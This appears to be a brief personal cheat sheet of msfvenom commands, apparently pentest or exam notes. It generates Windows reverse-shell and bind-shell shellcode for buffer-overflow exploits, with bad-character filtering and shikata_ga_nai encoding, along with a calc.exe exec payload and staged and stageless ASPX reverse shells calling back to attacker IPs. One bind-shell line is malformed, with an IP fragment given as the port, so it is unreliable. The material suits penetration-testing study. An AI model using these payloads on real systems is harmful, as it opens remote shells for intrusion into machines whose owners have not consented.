# msfvenom

msfvenom for BOF  
msfvenom -p windows/shell\_reverse\_tcp EXITFUNC=thread LHOST=192.168.132.128 LPORT=443 -f python -e x86/shikata\_ga\_nai -b '\x00\x0d\x0a'

reverse shell for shellcode  
msfvenom -p windows/shell\_reverse\_tcp LHOST=192.168.43.231 LPORT=8171 -f python -v shellcode -b '\x40\x0A\x00\x0D\xff\x0d\x3d\x20'

bind shell  
msfvenom -p windows/shell\_bind\_tcp LPORT=192.168.43 -f python -b '\xbadchars\' -v shellcode

cmd  
msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name shellcode\_calc CMD=calc.exe EXITFUNC=thread

\#tips arsitektur + encoding  
-e x86/shikata\_ga\_nai

\#stagless shell  
msfvenom -p windows/x64/shell\_reverse\_tcp lhost=192.168.119.198 lport=443 -f aspx -o shell.aspx  
msfvenom -p windows/x86/shell\_reverse\_tcp lhost=192.168.119.198 lport=443 -f aspx -o shell.aspx

\#staged shell

msfvenom -p windows/x64/shell/reverse\_tcp lhost=192.168.119.198 lport=443 -f aspx -o shell.aspx  
msfvenom -p windows/x86/shell/reverse\_tcp lhost=192.168.119.198 lport=443 -f aspx -o shell.aspx

